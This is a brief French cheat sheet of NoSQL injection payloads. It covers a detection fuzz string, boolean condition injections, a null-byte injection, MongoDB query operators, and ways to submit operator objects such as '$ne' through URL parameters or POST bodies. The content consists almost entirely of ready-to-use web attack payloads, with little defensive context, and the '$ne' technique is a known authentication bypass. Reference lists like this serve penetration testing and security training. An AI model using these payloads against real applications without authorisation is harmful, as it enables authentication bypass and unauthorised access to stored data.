## Fuzz pour détecter une injection NoSQL

``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``

`'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

### Comportement conditionnel

Injection de condition fausse : `' && 0 && 'x`

Injection de condition vraie : `' && 1 && 'x`

### Réécriture des conditions

Injection de condition fausse : `' || 0 || 'x`

Injection de condition vraie : `' || 1 || 'x`

Injection du caractère null : `'%00`

## Opérateurs NoSQL

- `$where` : match un document qui satisfait une expression JavaScript
- `$regex` : match un document qui contient une chaîne de caractères qui satisfait une expression régulière
- `$ne` : match un document qui ne contient pas une valeur
- `$in` : match un document qui contient une valeur dans un tableau

### Envoyer les opérateurs de query

Les opérateurs de query peuvent être insérés comme des objects imbriqués : `{"username":{"$ne":"invalid"}}`

Pour les entrées dans les URL, on peut les passer dans les paramètres, par exemple : `?username[$ne]=invalid`

Si ça ne marche pas en GET via les paramètres d'URL, on peut essayer de les passer dans le corps de la requête en POST.